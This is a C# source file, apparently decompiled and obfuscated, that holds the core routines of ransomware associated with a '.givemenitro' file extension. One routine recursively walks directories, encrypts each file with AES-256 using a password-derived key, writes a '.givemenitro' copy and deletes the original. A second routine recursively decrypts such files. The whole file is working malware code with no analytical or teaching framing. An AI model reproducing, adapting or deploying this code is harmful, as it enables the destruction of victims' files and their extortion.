using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class StartInternal
{
	public static int MethodBase = 0;

	private static CancelAsync Names = new CancelAsync("DEBUG", 0);

	private static string FullHMMatch = ".givemenitro";

	public static string _64Bit = Set_ColumnReader.Getmark;

	public static string SizeOfHeaders;

	public static List<string> Get_IsValueCreated = new List<string>();

	public static string IllogicalCallContext
	{
		set
		{
			try
			{
				string[] files = Directory.GetFiles(value);
				foreach (string text in files)
				{
					if (E_BOUNDS(text))
					{
						Names.Cancel("Decrypting: " + text);
						OFB(text, text.Substring(0, text.Length - FullHMMatch.Length), SizeOfHeaders);
					}
				}
				string[] directories = Directory.GetDirectories(value);
				for (int j = 0; j < directories.Length; j++)
				{
					string text3 = (IllogicalCallContext = directories[j]);
				}
			}
			catch (Exception ex)
			{
				Names.Conv_Ovf_I_Un(ex.Message);
			}
		}
	}

	public static void LocalSiteString(string string_0)
	{
		try
		{
			string[] files = Directory.GetFiles(string_0);
			foreach (string text in files)
			{
				if (!text.Contains(FullHMMatch))
				{
					Names.Cancel("Encrypting: " + text);
					Get_IsValueCreated.Add(text);
					HeaderNamespace(text, _64Bit);
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_ in directories)
			{
				LocalSiteString(string_);
			}
		}
		catch (Exception ex)
		{
			Names.Conv_Ovf_I_Un(ex.Message);
		}
	}

	private static bool E_BOUNDS(string string_0)
	{
		if (string_0.Contains(FullHMMatch) && string_0.Substring(string_0.Length - FullHMMatch.Length, FullHMMatch.Length) == FullHMMatch)
		{
			return true;
		}
		return false;
	}

	private static void HeaderNamespace(string string_0, string string_1)
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(string_0 + FullHMMatch, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Names.Conv_Ovf_I_Un(ex.Message);
		}
		finally
		{
			Names.GetEmptyCAHolder("Encypted " + string_0);
			MethodBase++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_0);
		}
	}

	private static void OFB(string string_0, string string_1, string string_2)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(string_0, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(string_1, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Names.Conv_Ovf_I_Un("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Names.Conv_Ovf_I_Un(ex2.Message);
		}
		try
		{
			cryptoStream.Close();
			Names.GetEmptyCAHolder("Decrypted: " + string_0);
		}
		catch (Exception ex3)
		{
			Names.Conv_Ovf_I_Un("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}
}
